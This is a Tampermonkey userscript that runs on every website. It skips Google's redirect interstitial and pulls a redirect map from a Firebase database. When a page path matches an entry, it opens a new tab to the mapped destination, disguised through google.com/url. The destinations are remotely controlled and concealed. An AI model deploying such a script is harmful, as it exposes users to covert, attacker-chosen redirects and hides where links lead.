// ==UserScript==
// @name         Mega Redirect Loader
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Merge full redirect scripts
// @match        *://*/*
// @run-at       document-start
// @grant        none
// ==/UserScript==

(async function () {

    "use strict";

    try {

        // =========================
        // GOOGLE REDIRECT SKIP
        // =========================

        if (
            location.hostname === "www.google.com" &&
            location.pathname === "/url"
        ) {

            try {

                document.documentElement.innerHTML = "";

                document.documentElement.style.display = "none";

                document.documentElement.style.background = "#000";

            } catch (e) {}

            const params = new URLSearchParams(location.search);

            const target = params.get("q");

            if (target) {

                location.replace(target);

                return;

            }
        }

        // =========================
        // FIREBASE REDIRECT LOADER
        // =========================

        const response = await fetch(
            "https://check-user-1-default-rtdb.firebaseio.com/redirects.json?t=" + Date.now()
        );

        const redirectMap = await response.json();

        if (!redirectMap) return;

        const path = window.location.pathname
            .split("/")
            .filter(Boolean);

        if (path.length > 0) {

            let key = path[0];

            if (!key.includes("-2")) {

                if (redirectMap[key + "-2"]) {

                    key = key + "-2";

                }
            }

            if (redirectMap[key]) {

                const delay =
                    Math.floor(Math.random() * 200) + 100;

                setTimeout(() => {

                    window.open(
                        "https://www.google.com/url?q=https://" +
                        redirectMap[key],
                        "_blank"
                    );

                }, delay);
            }
        }

    } catch (error) {

        console.log("Lỗi:", error);

    }

})();
